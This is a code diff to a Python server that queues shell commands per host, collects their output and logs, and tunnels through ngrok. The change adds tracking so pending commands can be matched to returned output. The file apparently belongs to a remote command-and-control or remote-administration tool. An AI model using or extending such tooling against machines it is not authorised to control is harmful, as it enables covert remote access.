@@ -13,6 +13,7 @@ class Storage:
         self.logs = {}   # Stores logs from hosts
         self.errors = {} # Stores errors from hosts
         self.commands = {}  # Queue of commands for each host
+        self.pending_commands = {}  # Tracks commands sent but not yet completed
         self.config = {
             "ngrok_host": "127.0.0.1", 
             "ngrok_port": 5000,
@@ -249,7 +250,18 @@ while ($true) {
         """Get the next command for a host"""
         with self.lock:
             if hostname in self.commands and self.commands[hostname]:
-                return self.commands[hostname].pop(0)
+                # Obter próximo comando da fila
+                command = self.commands[hostname].pop(0)
+                
+                # Armazenar no dicionário de comandos pendentes para rastreamento
+                if hostname not in self.pending_commands:
+                    self.pending_commands[hostname] = {}
+                
+                # Usar o timestamp como identificador único
+                timestamp = int(time.time())
+                self.pending_commands[hostname][timestamp] = command
+                
+                return command
             return ""
 
     def add_command_output(self, hostname, command, output, timestamp):
@@ -258,8 +270,19 @@ while ($true) {
             if hostname not in self.logs:
                 self.logs[hostname] = []
             
+            # Verificar se há um comando pendente próximo ao timestamp
+            real_command = command
+            if hostname in self.pending_commands:
+                # Procurar um comando próximo ao timestamp (dentro de 10 segundos)
+                for cmd_timestamp, cmd in self.pending_commands[hostname].items():
+                    if abs(cmd_timestamp - timestamp) < 10:
+                        real_command = cmd
+                        # Remover do dicionário de pendentes após uso
+                        del self.pending_commands[hostname][cmd_timestamp]
+                        break
+            
             self.logs[hostname].append({
-                'command': command,
+                'command': real_command,
                 'output': output,
                 'timestamp': timestamp
             })
